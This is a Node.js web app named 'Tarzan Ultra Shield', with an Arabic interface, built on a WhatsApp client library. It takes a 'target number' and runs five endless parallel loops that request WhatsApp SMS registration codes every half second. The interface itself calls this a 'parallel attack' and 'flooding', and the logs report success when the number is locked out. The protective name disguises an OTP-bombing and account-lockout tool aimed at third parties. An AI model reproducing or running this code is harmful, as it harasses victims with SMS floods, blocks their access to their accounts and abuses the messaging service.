/**
 * 👑 TARZAN ULTRA SHIELD - HYPER SPEED EDITION 👑
 * نظام القفل الفوري لخدمة الـ OTP - سرعة جنونية (30 ثانية)
 * --------------------------------------------------
 * ملاحظة: هذا النظام يستهلك موارد السيرفر لإرسال طلبات متوازية مكثفة.
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    pino,
    delay
} = require('@whiskeysockets/baileys');
const express = require('express');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==========================================
// 🎨 الواجهة العظمى (تصميم هجومي أحمر)
// ==========================================
const htmlInterface = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝑻𝑨𝑹𝒁𝑨𝑵 𝑯𝒀𝑷𝑬𝑹 𝑺𝑯𝑰𝑬𝑳𝑫</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        body { font-family: 'Cairo', sans-serif; background-color: #080000; color: #fff; }
        .red-neon { box-shadow: 0 0 20px rgba(220, 38, 38, 0.5); border: 1px solid rgba(220, 38, 38, 0.5); }
        .glass { background: rgba(255, 0, 0, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .critical-pulse { animation: pulse-red 1s infinite; }
        @keyframes pulse-red {
            0% { text-shadow: 0 0 5px #ef4444; }
            50% { text-shadow: 0 0 20px #ef4444; }
            100% { text-shadow: 0 0 5px #ef4444; }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-4xl w-full space-y-6">
        <div class="text-center space-y-2">
            <h1 class="text-6xl font-black text-red-600 italic critical-pulse tracking-tighter">𝑻𝑨𝑹𝒁𝑨𝑵 𝑼𝑳𝑻𝑹𝑨</h1>
            <p class="text-gray-500 font-bold uppercase tracking-widest text-xs">نظام القفل السريع - وضع الهجوم المتوازي</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
            <!-- Main Control -->
            <div class="md:col-span-3 glass p-10 rounded-[2rem] red-neon space-y-8">
                <div class="space-y-4">
                    <label class="block text-sm font-bold text-red-500">الرقم المستهدف للتحصين السريع:</label>
                    <input type="text" id="phone" placeholder="967733..." class="w-full bg-black/50 border border-white/10 p-5 rounded-2xl focus:outline-none focus:border-red-600 text-3xl font-mono text-center tracking-widest transition-all">
                </div>

                <div class="grid grid-cols-2 gap-6">
                    <button onclick="startHyperShield()" id="startBtn" class="bg-red-600 hover:bg-red-700 py-5 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-lg shadow-red-900/50 flex items-center justify-center gap-3">
                        <i class="fas fa-skull"></i> إطلاق المحرك
                    </button>
                    <button onclick="location.reload()" class="bg-white/5 hover:bg-white/10 py-5 rounded-2xl font-bold transition-all border border-white/10">
                        <i class="fas fa-undo"></i> إعادة تعيين
                    </button>
                </div>

                <!-- Monitor -->
                <div class="grid grid-cols-3 gap-4">
                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
                        <p class="text-[10px] text-gray-500 mb-1 uppercase">النبضات</p>
                        <p id="pulseCount" class="text-2xl font-bold text-red-500">0</p>
                    </div>
                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
                        <p class="text-[10px] text-gray-500 mb-1 uppercase">الوقت المنقضي</p>
                        <p id="timer" class="text-2xl font-bold text-white">00:00</p>
                    </div>
                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
                        <p class="text-[10px] text-gray-500 mb-1 uppercase">حالة القفل</p>
                        <p id="lockStatus" class="text-2xl font-bold text-yellow-500">--</p>
                    </div>
                </div>
            </div>

            <!-- Terminal -->
            <div class="glass p-6 rounded-[2rem] border border-white/5 flex flex-col h-full min-h-[400px]">
                <h3 class="text-xs font-bold text-red-900 mb-4 tracking-tighter uppercase font-mono">Terminal Output</h3>
                <div id="logs" class="flex-1 overflow-y-auto space-y-2 text-[10px] font-mono">
                    <div class="text-red-500 opacity-50">> System ready for hyper-speed...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let startTime = null;
        let timerInt = null;

        async function startHyperShield() {
            const phone = document.getElementById('phone').value;
            if(!phone) return;

            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').classList.add('opacity-50');
            
            startTime = Date.now();
            timerInt = setInterval(updateTimer, 1000);
            
            addLog("!! بدء الهجوم المتوازي - وضع العظمة نشط !!", "text-red-500 font-bold");

            const response = await fetch('/start-hyper', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone })
            });

            // تحديث الحالة كل ثانية
            setInterval(async () => {
                const res = await fetch('/status');
                const data = await res.json();
                document.getElementById('pulseCount').innerText = data.pulses;
                document.getElementById('lockStatus').innerText = data.wait;
                if(data.log) addLog(data.log, data.color);
            }, 1000);
        }

        function updateTimer() {
            const diff = Math.floor((Date.now() - startTime) / 1000);
            const m = Math.floor(diff / 60).toString().padStart(2, '0');
            const s = (diff % 60).toString().padStart(2, '0');
            document.getElementById('timer').innerText = m + ":" + s;
        }

        function addLog(msg, color) {
            const logs = document.getElementById('logs');
            const d = document.createElement('div');
            d.className = color + " border-r border-red-600 pr-2";
            d.innerText = `> ${msg}`;
            logs.prepend(d);
        }
    </script>
</body>
</html>
`;

// ==========================================
// 🚀 المحرك الخلفي (Hyper Logic)
// ==========================================

let pulses = 0;
let lastWait = "تحليل...";
let hyperLog = { log: "", color: "" };

app.get('/', (req, res) => res.send(htmlInterface));

app.post('/start-hyper', async (req, res) => {
    const { phone } = req.body;
    pulses = 0;
    
    // إطلاق "خيوط" (Threads) متوازية
    for(let i=0; i<5; i++) {
        runHyperPulse(phone);
    }
    
    res.json({ success: true });
});

app.get('/status', (req, res) => {
    res.json({ pulses, wait: lastWait, ...hyperLog });
    hyperLog = { log: "", color: "" }; // تنظيف اللوج بعد إرساله
});

async function runHyperPulse(phone) {
    const { state } = await useMultiFileAuthState('hyper_shield_auth');
    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
    });

    const countryCode = phone.startsWith('967') ? '967' : phone.substring(0, 3);
    const nationalNumber = phone.substring(countryCode.length);

    while (true) {
        try {
            // إرسال الطلب فوراً دون انتظار
            sock.requestRegistrationCode({
                phoneNumber: phone,
                phoneNumberCountryCode: countryCode,
                phoneNumberNationalNumber: nationalNumber,
                method: 'sms'
            }).then(() => {
                pulses++;
                hyperLog = { log: "صلية ناجحة.. جاري الإغراق.", color: "text-blue-400" };
            }).catch(err => {
                pulses++;
                let wait = err.data?.value || "300";
                lastWait = wait + " ث";
                hyperLog = { log: `تم القفل! الانتظار المطلوب: ${wait} ثانية`, color: "text-red-500 font-black" };
            });

            // تأخير ضئيل جداً لضمان عدم توقف الـ Event Loop
            await new Promise(r => setTimeout(r, 500)); 
        } catch (e) {}
    }
}

app.listen(PORT, () => console.log(`🚀 Hyper Shield Active on Port ${PORT}`));
